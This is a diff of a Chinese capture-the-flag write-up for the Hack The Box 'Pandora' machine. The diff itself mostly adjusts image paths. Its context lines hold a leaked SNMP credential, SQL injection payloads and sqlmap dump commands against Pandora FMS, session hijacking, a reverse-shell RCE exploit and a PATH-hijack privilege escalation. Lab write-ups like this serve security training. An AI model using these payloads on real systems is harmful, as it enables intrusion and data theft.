@@ -9,7 +9,7 @@ categories: 红队打靶-Linux
 
 # namp
 
-![image-20250403145819666](Pandora/image-20250403145819666.png)
+![image-20250403145819666](./Pandora/image-20250403145819666.png)
 
 # 161端口
 
@@ -17,7 +17,7 @@ categories: 红队打靶-Linux
 snmpwalk -v 2c -c public 9.0.0.1 所有系统信息都获取
 ```
 
-![image-20250403152536227](Pandora/image-20250403152536227.png)
+![image-20250403152536227](./Pandora/image-20250403152536227.png)
 
 ```
 daniel:HotelBabylon23
@@ -25,31 +25,31 @@ daniel:HotelBabylon23
 
 其中找到一个用户名和密码,ssh连接成功，目录下没什么有用的东西
 
-![image-20250403160119609](Pandora/image-20250403160119609.png)
+![image-20250403160119609](./Pandora/image-20250403160119609.png)
 
 `home`目录下有个`matt`用户，该用户下有`user.txt`，`daniel`无权限读取
 
-![image-20250403160238522](Pandora/image-20250403160238522.png)
+![image-20250403160238522](./Pandora/image-20250403160238522.png)
 
 # 80端口
 
-![image-20250403152736544](Pandora/image-20250403152736544.png)
+![image-20250403152736544](./Pandora/image-20250403152736544.png)
 
 assets目录下也没有什么有用的信息
 
 在var/www/下有html和pandora，html下就是panda.htb的源码，应该还有另外一个网站
 
-![image-20250403163140027](Pandora/image-20250403163140027.png)
+![image-20250403163140027](./Pandora/image-20250403163140027.png)
 
 得到网站的中间件为apache，去看看apache的配置文件
 
-![image-20250403163321749](Pandora/image-20250403163321749.png)
+![image-20250403163321749](./Pandora/image-20250403163321749.png)
 
 apache目录在`/etc/apache2/`，`sites-enable`下有两个配置文件，另一个的域名为`pandora.panda.htb`用户是matt
 
-![image-20250403163614778](Pandora/image-20250403163614778.png)
+![image-20250403163614778](./Pandora/image-20250403163614778.png)
 
-![image-20250403163632172](Pandora/image-20250403163632172.png)
+![image-20250403163632172](./Pandora/image-20250403163632172.png)
 
 但是`pandora.panda.htb`只在本地监听,ssh连接的时候，将靶机的80端口转发到本机的9002,访问本机的9002即可访问到靶机的80端口
 
@@ -57,15 +57,15 @@ apache目录在`/etc/apache2/`，`sites-enable`下有两个配置文件，另一
 ssh daniel@10.10.11.136 -L 9002:localhost:80
 ```
 
-![image-20250403171028152](Pandora/image-20250403171028152.png)
+![image-20250403171028152](./Pandora/image-20250403171028152.png)
 
-最下方有版本号，该版本存在多个漏洞，先利用SQL注入[CVE-2021-32099_SQLi](https://github.com/l3eol3eo/CVE-2021-32099_SQLi?tab=readme-ov-file)得到账号密码登录
+最下方有版本号，该版本存在多个漏洞，先利用SQL注入[CVE-2021-32099_SQLi](./https://github.com/l3eol3eo/CVE-2021-32099_SQLi?tab=readme-ov-file)得到账号密码登录
 
-![image-20250403173320023](Pandora/image-20250403173320023.png)
+![image-20250403173320023](./Pandora/image-20250403173320023.png)
 
 当`session_id=1'`单引号闭合时会报sql错误
 
-![image-20250403173329627](Pandora/image-20250403173329627.png)
+![image-20250403173329627](./Pandora/image-20250403173329627.png)
 
 可以手注也可以使用sqlmap
 
@@ -91,7 +91,7 @@ http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1%2
 http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1' UNION SELECT 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3 --+
 ```
 
-![image-20250403174739239](Pandora/image-20250403174739239.png)
+![image-20250403174739239](./Pandora/image-20250403174739239.png)
 
 #### 表名
 
@@ -102,7 +102,7 @@ http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1' 
 
 
 
-![image-20250403175011395](Pandora/image-20250403175011395.png)
+![image-20250403175011395](./Pandora/image-20250403175011395.png)
 
 ```
 tvisual_console_elements_cac
@@ -113,7 +113,7 @@ tvisual_console_elements_cac
 http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1' UNION SELECT 1,extractvalue(1,concat(0x7e,(select substring(group_concat(table_name),1,30) from information_schema.tables where table_schema=database()))),3 --+
 ```
 
-![image-20250403175151970](Pandora/image-20250403175151970.png)
+![image-20250403175151970](./Pandora/image-20250403175151970.png)
 
 ```
 _cache,tservice_element,tuser_
@@ -132,7 +132,7 @@ tvisual_console_elements_cache,tservice_element,tuser_
 sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1" --batch --dbs 
 ```
 
-![image-20250403175405485](Pandora/image-20250403175405485.png)
+![image-20250403175405485](./Pandora/image-20250403175405485.png)
 
 #### 表名
 
@@ -329,7 +329,7 @@ sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?ses
 
 ```
 
-![image-20250403204812339](Pandora/image-20250403204812339.png)
+![image-20250403204812339](./Pandora/image-20250403204812339.png)
 
 拿到密码之后破解不了，还有个session表，尝试替换session登录
 
@@ -337,7 +337,7 @@ sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?ses
 sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1" --batch -D pandora -T tsessions_php --columns --dump  --threads 10
 ```
 
-![image-20250405163143411](Pandora/image-20250405163143411.png)
+![image-20250405163143411](./Pandora/image-20250405163143411.png)
 
 #### 数据
 
@@ -346,52 +346,52 @@ sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?ses
 
 ```
 
-![image-20250403204832190](Pandora/image-20250403204832190.png)
+![image-20250403204832190](./Pandora/image-20250403204832190.png)
 
 ```shell
 sqlmap -u "http://localhost:9002/pandora_console/include/chart_generator.php?session_id=1" --batch -D pandora -T tsessions_php -C "data,id_session" --threads 10  --dump --where "data<>''"
 ```
 
-![image-20250405163222865](Pandora/image-20250405163222865.png)
+![image-20250405163222865](./Pandora/image-20250405163222865.png)
 
 登录时将session替换为matt的session即可登录到matt用户的后台
 
-![image-20250405164316757](Pandora/image-20250405164316757.png)
+![image-20250405164316757](./Pandora/image-20250405164316757.png)
 
 ## 远程代码执行
 
-[CVE-2020-13851 Pandora FMS 7.44](https://github.com/hadrian3689/pandorafms_7.44)
+[CVE-2020-13851 Pandora FMS 7.44](./https://github.com/hadrian3689/pandorafms_7.44)
 
-![image-20250405184421005](Pandora/image-20250405184421005.png)
+![image-20250405184421005](./Pandora/image-20250405184421005.png)
 
 使用该exp可以直接反弹matt的shell
 
-![image-20250405184427649](Pandora/image-20250405184427649.png)
+![image-20250405184427649](./Pandora/image-20250405184427649.png)
 
 # 提权
 
 查看运用suid权限的文件，有个pandora的备份程序
 
-![image-20250405190823550](Pandora/image-20250405190823550.png)
+![image-20250405190823550](./Pandora/image-20250405190823550.png)
 
 以FMC反弹过来的matt用户的shell没有权限运行sudo和suid权限的文件，是因为apache配置文件中给matt用户定义在了matt组中
 
-![image-20250405190530266](Pandora/image-20250405190530266.png)
+![image-20250405190530266](./Pandora/image-20250405190530266.png)
 
 写入自己公钥使用私钥去连接
 
-![image-20250405190231789](Pandora/image-20250405190231789.png)
+![image-20250405190231789](./Pandora/image-20250405190231789.png)
 
-![image-20250405190438894](Pandora/image-20250405190438894.png)
+![image-20250405190438894](./Pandora/image-20250405190438894.png)
 
 运行pandora_backup，使用tar来对文件内容进行压缩
 
-![image-20250405190632452](Pandora/image-20250405190632452.png)
+![image-20250405190632452](./Pandora/image-20250405190632452.png)
 
 并且suid权限的文件中没有`tar`那就说明tar是从环境变量中去读取，那么写一个恶意的`tar`让`pandora_backup`来运行达到提权的目的
 
-![image-20250405191517100](Pandora/image-20250405191517100.png)
+![image-20250405191517100](./Pandora/image-20250405191517100.png)
 
 然后运行pandora_backup监听4444端口即可得到root的shell
 
-![image-20250405191711107](Pandora/image-20250405191711107.png)
+![image-20250405191711107](./Pandora/image-20250405191711107.png)
